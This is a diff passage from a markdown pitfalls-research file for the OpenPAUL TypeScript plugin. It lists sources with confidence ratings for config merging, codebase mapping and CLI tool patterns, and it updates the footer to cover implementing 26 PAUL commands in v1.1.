+- **Config merging strategies:** Webpack config merging, ESLint config composition - MEDIUM confidence (tool-specific patterns)
+- **Domain expertise:** Personal experience with CLI config systems, multi-source configuration - Synthesized from experience
+
+**Codebase Mapping:**
+- **Incremental indexing:** Search index incremental updates, file system watching - MEDIUM confidence (well-established patterns)
+- **Performance patterns:** Large codebase analysis tools (Sourcegraph, GitHub code search) - MEDIUM confidence (tool-specific patterns)
+- **Domain expertise:** Personal experience with code analysis tools, AST parsing, file system operations - Synthesized from experience
+
+**CLI Tool Patterns (General):**
+- **Atomic file operations:** POSIX rename atomicity, database transactions - HIGH confidence (fundamental concept)
+- **User experience patterns:** CLI design best practices, command feedback - MEDIUM confidence (UX principles)
+- **Domain expertise:** Personal experience building CLI tools, developer productivity tools - Synthesized from experience
+
 ---
 
-*Pitfalls research for: Session management in development workflow tools*
-*Context: Adding pause, resume, handoff, status deprecation to OpenPAUL TypeScript plugin*
+*Pitfalls research for: Full PAUL command implementation (26 commands across 8 categories)*
+*Context: OpenPAUL v1.1 - implementing remaining 20 commands after v1.0 baseline*
 *Researched: 2026-03-05*
